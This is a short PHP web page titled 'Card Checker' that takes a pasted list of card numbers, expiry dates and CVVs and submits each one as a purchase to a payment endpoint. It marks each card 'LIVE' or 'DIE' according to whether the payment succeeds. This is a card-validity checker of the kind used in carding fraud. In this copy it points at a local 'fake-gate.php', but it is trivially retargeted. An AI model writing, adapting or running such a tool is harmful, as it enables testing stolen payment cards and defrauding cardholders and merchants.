<?php 
	if(empty($_POST['cc-list'])){
		header("Location: index.php");
	}
	error_reporting(0);
 ?>
<!DOCTYPE html>
<html lang="en">
<head>
	<meta charset="UTF-8">
	<title>Card Checker</title>
	<link rel="stylesheet" href="style/style.css">
	<script src="https://code.jquery.com/jquery-3.2.1.js"></script>
</head>
<body>
	<div class="content">

		<h1>Results</h1>
		<br>
		<table style="width: 100%">
			<tr>
				<th>Result</th>
				<th>Card number</th>
				<th>Month</th>
				<th>Year</th>
				<th>CVV</th>
			</tr>

			<?php
				$list = explode("\n", $_POST['cc-list']);
				foreach ($list as $key => $cc) {
					$card = explode("|", $cc)[0];
					$month = explode("|", $cc)[1];
					$year = explode("|", $cc)[2];
					$cvv = explode("|", $cc)[3];
					if(!(empty($card) && empty($month) && empty($year) && empty($cvv))){

					$payment_url = 	"http://localhost/ceker/fake-gate.php";	
					$postdata = "cardnumber=$card&month=$month&year=$year&cvv=$cvv&buy=Buy";
					$success_message = "Paid successfully!";

					$curl = curl_init($payment_url);
					curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
					curl_setopt($curl, CURLOPT_POST, 1);
					curl_setopt($curl, CURLOPT_POSTFIELDS, $postdata);
					$result = curl_exec($curl);

					if(strpos($result, $success_message)){
						echo "<tr style='color: green'>";
						echo "<td>LIVE</td>";
						echo "<td>$card</td>";
						echo "<td>$month</td>";
						echo "<td>$year</td>";
						echo "<td>$cvv</td>";
						echo "</tr>";
					}else{
						echo "<tr style='color: #fe3131'>";
						echo "<td>DIE</td>";
						echo "<td>$card</td>";
						echo "<td>$month</td>";
						echo "<td>$year</td>";
						echo "<td>$cvv</td>";
						echo "</tr>";
					}
					}
				}
			?>
		</table>
	</div>
</body>
</html>